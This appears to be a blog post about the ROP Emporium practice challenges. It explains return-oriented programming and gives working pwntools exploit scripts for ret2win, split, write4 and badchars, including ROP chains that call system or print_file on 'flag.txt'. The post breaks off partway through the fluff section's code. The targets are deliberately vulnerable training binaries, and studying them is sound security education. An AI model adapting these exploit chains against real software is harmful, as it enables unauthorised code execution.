<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Overview ROP highlights a classical strategy across all facets of security exploitation, living off the land.
ret2win #2 ret2win is the first challenge among the rop emporium suite and plays out like a classical buffer overflow. The only real takeaway from this challenge is to note the state of the memory protections enabled for the binary.
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) We see that the NX bit is enabled this is true of almost all ROP challenges since we wish to prevent execution off the stack with shellcode." />
<meta name="keywords" content=", hacking, pentesting, pwntools, Exploit Development" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="#252627" />
<link rel="canonical" href="https://cybernetic.coffee/blog/rop-emporium-revisited/" />


    <title>
        
            ROP Emporium Revisited :: Cybernetic Coffee 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.64cc374c419669695f00d5c55727fea41e0fdc86b9beb1b4d1d1bcf24284f422.css">




<link rel="shortcut icon" href="https://cybernetic.coffee/images/favicon.ico" />


<meta itemprop="name" content="ROP Emporium Revisited">
<meta itemprop="description" content="Overview ROP highlights a classical strategy across all facets of security exploitation, living off the land.
ret2win #2 ret2win is the first challenge among the rop emporium suite and plays out like a classical buffer overflow. The only real takeaway from this challenge is to note the state of the memory protections enabled for the binary.
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) We see that the NX bit is enabled this is true of almost all ROP challenges since we wish to prevent execution off the stack with shellcode."><meta itemprop="datePublished" content="2021-07-27T00:00:00+00:00" />
<meta itemprop="dateModified" content="2021-07-27T00:00:00+00:00" />
<meta itemprop="wordCount" content="1045">
<meta itemprop="keywords" content="hacking,pentesting,pwntools,Exploit Development," />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="ROP Emporium Revisited"/>
<meta name="twitter:description" content="Overview ROP highlights a classical strategy across all facets of security exploitation, living off the land.
ret2win #2 ret2win is the first challenge among the rop emporium suite and plays out like a classical buffer overflow. The only real takeaway from this challenge is to note the state of the memory protections enabled for the binary.
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) We see that the NX bit is enabled this is true of almost all ROP challenges since we wish to prevent execution off the stack with shellcode."/>





    <meta property="article:section" content="Hacking" />

    <meta property="article:section" content="Binary Exploitation" />



    <meta property="article:published_time" content="2021-07-27 00:00:00 &#43;0000 UTC" />








    </head>

    <body class="dark-theme">
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <script src="https://kit.fontawesome.com/5eb4842dc5.js" crossorigin="anonymous"></script>

<a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__text">Cybernetic <i class="fas fa-mug-hot"> </i> </span>
            <span class="logo__mark"><i class="fas fa-terminal"></i></span>
            <span class="logo__cursor" style=
                  "
                   background-color:#00ba68;
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://cybernetic.coffee/feed/">Activity Feed</a></li><li><a href="https://cybernetic.coffee/projects/">Projects</a></li><li><a href="https://cybernetic.coffee/blog">Blog</a></li><li><a href="https://cybernetic.coffee/ctf">CTF</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            

            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
</svg>
</span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">
        
        <div class="post-info">
            <p>
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
                    <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
                    <line x1="16" y1="2" x2="16" y2="6"></line>
                    <line x1="8" y1="2" x2="8" y2="6"></line>
                    <line x1="3" y1="10" x2="21" y2="10"></line>
                </svg>
                
                    2021-07-27 10:00
                

                
            </p>
        </div>
        

        <article>
            <h2 class="post-title"><a href="https://cybernetic.coffee/blog/rop-emporium-revisited/">ROP Emporium Revisited</a></h2>

            

            
            <div class="post-info">

                <div class="sharing-buttons">
                    








<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2frop-emporium-revisited%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>



































<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fcybernetic.coffee%2fblog%2frop-emporium-revisited%2f&amp;resubmit=true&amp;title=ROP%20Emporium%20Revisited" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


















<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fcybernetic.coffee%2fblog%2frop-emporium-revisited%2f&amp;t=ROP%20Emporium%20Revisited" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>









                </div>
            </div>
            

            <hr />

            

            

            <div class="post-content">
                <h2 id="overview">Overview</h2>
<blockquote>
<p>ROP highlights a classical strategy across all facets of security exploitation, living off the land.</p>
</blockquote>
<h2 id="ret2win-2">ret2win #2</h2>
<p><code>ret2win</code> is the first challenge among the rop emporium suite and plays out like a classical <a href="../basic-stack-based-overflows">buffer overflow</a>. The only real takeaway from this challenge is to note the state of the memory protections enabled for the binary.</p>
<pre tabindex="0"><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre><p>We see that the <code>NX</code> bit is <strong>enabled</strong> this is true of almost all ROP challenges since we wish to prevent execution off the stack with shellcode. We note however that we can still control the return pointer and thus redirect code execution. Our goal is to call the <code>ret2win</code> function, but why can we even call this function?</p>
<p>If you understand the notion off living off the land you will recognize the key utility of ROP and why it can be used to circumvent no execute (<code>NX</code>) memory protections. The instructions we execute <em>already exist within the program</em> after compilation.</p>
<p>In this case that code is the win function <code>ret2win</code> but there are many other instructions within the binary, some which are never even used by the program in its running lifetime &hellip;</p>
<p>Compilers are not perfect programs, and indeed <code>x86</code> as an instruction set has its oddities, they leave behind garbage instructions as well as carrying out other weird behavior.</p>
<blockquote>
<p>These leftover instructions, often called &lsquo;gadgets&rsquo;, can be of great use to us.</p>
</blockquote>
<p>They are an example of a <a href="https://en.wikipedia.org/wiki/Weird_machine">weird machine</a>. We will explore their utility in detail as we continue but for now know they exist alongside the functions and other instructions that make up the program.</p>
<p>With this understanding, we proceed by fuzzing the offset to the return pointer with cyclic (yes even tho it tells us the bytes to overwrite). We can then hook <code>ret2win</code> from the symbols table and use <code>fit/flat</code> to pad the offset to our packed address.</p>
<p>The exploit for the 32 bit binary (this is the track we will follow) is as follows.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2win32&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## get da banner</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Receiving banner ...&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fit({
</span></span><span style="display:flex;"><span>    cyclic_find(<span style="color:#e6db74">&#39;laaa&#39;</span>): p32(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;ret2win&#39;</span>])
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="split">split</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>call(elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>], [next(elf<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/cat flag.txt&#39;</span>))])
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fit({
</span></span><span style="display:flex;"><span>    cyclic_find(<span style="color:#e6db74">&#39;laaa&#39;</span>): rop<span style="color:#f92672">.</span>chain()
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="write4">write4</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::: .data at this address is uninitialized ::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#data_section = elf.get_section_by_name(&#39;.data&#39;).header.sh_addr</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># better way</span>
</span></span><span style="display:flex;"><span>data_section <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>data_start
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.data starts @</span><span style="color:#e6db74">{</span>hex(data_section)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pwntools hides some gadgets from us so we resolve via</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># function</span>
</span></span><span style="display:flex;"><span>mov_gadget <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;usefulGadgets&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;gadget: mov [edi], ebp; ret; @ </span><span style="color:#e6db74">{</span>mov_gadget<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># this lookup fails if the list of registers to pop cannot</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># be met</span>
</span></span><span style="display:flex;"><span>pop_gadget <span style="color:#f92672">=</span> rop<span style="color:#f92672">.</span>search(<span style="color:#ae81ff">0</span>, [<span style="color:#e6db74">&#39;edi&#39;</span>, <span style="color:#e6db74">&#39;ebp&#39;</span>], <span style="color:#e6db74">&#39;regs&#39;</span>)<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;pop gadget: pop edi; pop ebp; ret; @ </span><span style="color:#e6db74">{</span>hex(pop_gadget)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;::: Beginning write sequence for &#39;flag.txt&#39; ::: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Writing .data address to edi, &#39;flag&#39; to ebp ...&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::: create chain :::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw([
</span></span><span style="display:flex;"><span>    pop_gadget,             <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
</span></span><span style="display:flex;"><span>    data_section,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flag&#39;</span>,                 <span style="color:#75715e"># write first 4 bytes of &#39;flag.txt&#39;</span>
</span></span><span style="display:flex;"><span>    mov_gadget,             <span style="color:#75715e"># mov [edi], ebp; ret;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pop_gadget,             <span style="color:#75715e"># pop edi; pop ebp; ret;</span>
</span></span><span style="display:flex;"><span>    data_section <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;.txt&#39;</span>,
</span></span><span style="display:flex;"><span>    mov_gadget              <span style="color:#75715e"># mov [edi], ebp; ret;</span>
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span><span style="color:#75715e"># printfile arg in .data</span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>print_file(data_section)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fit({
</span></span><span style="display:flex;"><span>    cyclic_find(<span style="color:#e6db74">&#39;laaa&#39;</span>): rop<span style="color:#f92672">.</span>chain()
</span></span><span style="display:flex;"><span>})
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="badchars">badchars</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::::::: setup ::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>badchars <span style="color:#f92672">=</span> enhex(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;xga.&#39;</span>)           <span style="color:#75715e"># convert badchars to hex</span>
</span></span><span style="display:flex;"><span>bet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bcdefhijklmnopqrstuvwyz&#39;</span>     <span style="color:#75715e"># cleansed alphabet</span>
</span></span><span style="display:flex;"><span>data_section <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols<span style="color:#f92672">.</span>data_start
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;.data starts @</span><span style="color:#e6db74">{</span>hex(data_section)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::: resolve gadgets ::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>ret_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048386</span>                              <span style="color:#75715e"># ret</span>
</span></span><span style="display:flex;"><span>xor_gadget <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;usefulGadgets&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>        <span style="color:#75715e"># xor  BYTE PTR [ebp+0x0], bl</span>
</span></span><span style="display:flex;"><span>mov_gadget <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;usefulGadgets&#39;</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">12</span>       <span style="color:#75715e"># mov  DWORD PTR [edi], esi</span>
</span></span><span style="display:flex;"><span>pop_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080485b9</span>                              <span style="color:#75715e"># pop esi; pop edi; pop ebp;</span>
</span></span><span style="display:flex;"><span>pop_ebp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080485bb</span>                                 <span style="color:#75715e"># pop ebp;</span>
</span></span><span style="display:flex;"><span>pop_ebx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804839d</span>                                 <span style="color:#75715e"># pop ebx;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># :::::::::::::::::::::::::::: exploit :::::::::::::::::::::::::</span>
</span></span><span style="display:flex;"><span>target_str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;flag.txt&#39;</span>
</span></span><span style="display:flex;"><span>xor_key <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>
</span></span><span style="display:flex;"><span>encoded_target_str <span style="color:#f92672">=</span> xor(target_str, xor_key)
</span></span><span style="display:flex;"><span>flag_str, txt_str <span style="color:#f92672">=</span> encoded_target_str[:<span style="color:#ae81ff">4</span>], encoded_target_str[<span style="color:#ae81ff">4</span>:]
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Encoded flag: </span><span style="color:#e6db74">{</span>flag_str<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}{</span>txt_str<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>decoder_chain <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># xor&#39;s each byte of the xor&#39;d string in the data</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># section with the xor key to restore it back to</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># the original string &#39;flag.txt&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> encoded_target_str:
</span></span><span style="display:flex;"><span>    decoder_chain <span style="color:#f92672">+=</span> pack(pop_ebp)
</span></span><span style="display:flex;"><span>    decoder_chain <span style="color:#f92672">+=</span> pack(data_section <span style="color:#f92672">+</span> offset)
</span></span><span style="display:flex;"><span>    decoder_chain <span style="color:#f92672">+=</span> pack(pop_ebx)
</span></span><span style="display:flex;"><span>    decoder_chain <span style="color:#f92672">+=</span> pack(xor_key)
</span></span><span style="display:flex;"><span>    decoder_chain <span style="color:#f92672">+=</span> pack(xor_gadget)
</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>raw([
</span></span><span style="display:flex;"><span>    pop_gadget,         <span style="color:#75715e"># pop esi; pop edi; pop ebp;</span>
</span></span><span style="display:flex;"><span>    flag_str,           <span style="color:#75715e"># &#39;flag&#39; ^ xor_key</span>
</span></span><span style="display:flex;"><span>    data_section,
</span></span><span style="display:flex;"><span>    ret_gadget,         <span style="color:#75715e"># ebp = ret</span>
</span></span><span style="display:flex;"><span>    mov_gadget,         <span style="color:#75715e"># mov  DWORD PTR [edi], esi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pop_gadget,         <span style="color:#75715e"># pop esi; pop edi; pop ebp;</span>
</span></span><span style="display:flex;"><span>    txt_str,            <span style="color:#75715e"># &#39;.txt&#39; ^ xor_key</span>
</span></span><span style="display:flex;"><span>    data_section <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>,
</span></span><span style="display:flex;"><span>    ret_gadget,         <span style="color:#75715e"># ebp = ret</span>
</span></span><span style="display:flex;"><span>    mov_gadget,         <span style="color:#75715e"># mov  DWORD PTR [edi], esi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    decoder_chain       <span style="color:#75715e"># restore the xor&#39;d flag str</span>
</span></span><span style="display:flex;"><span>])
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>print_file(data_section)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> fit({
</span></span><span style="display:flex;"><span>    cyclic_find(<span style="color:#e6db74">&#39;nbbb&#39;</span>, alphabet<span style="color:#f92672">=</span>bet): rop<span style="color:#f92672">.</span>chain(),
</span></span><span style="display:flex;"><span>}, filler<span style="color:#f92672">=</span>bet)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;&gt; &#39;</span>, payload)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellit</span>
</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="fluff">fluff</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TEMP ← SRC1;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">MASK ← SRC2;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">DEST ← 0 ;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">m← 0, k← 0;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">DO WHILE m&lt; OperandSize
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    IF MASK[ m] = 1 THEN
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        DEST[ k] ← TEMP[ m];
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        k ← k+ 1;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    FI
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    m ← m+ 1;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">OD
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">bruteforce_mask_value</span>(mask, target_value):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    create the stream of bytes that will produce
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    the target value when suppied as an operand to
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    the ptex instruction with the given mask
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    needed_bytes <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># logic from @cryptocat</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> target_value:
</span></span><span style="display:flex;"><span>        mask_reversed <span style="color:#f92672">=</span> bits(mask, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)
</span></span><span style="display:flex;"><span>        char_bits <span style="color:#f92672">=</span> bits(u8(char), endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;little&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        set_bits_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        mask_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>        set_bits <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> set_bits_count <span style="color:#f92672">&lt;</span> len(char_bits) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (char_bits[set_bits_count] <span style="color:#f92672">==</span> mask_reversed[mask_offset]):
</span></span><span style="display:flex;"><span>                set_bits <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;1&#39;</span>
</span></span><span style="display:flex;"><span>                set_bits_count <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
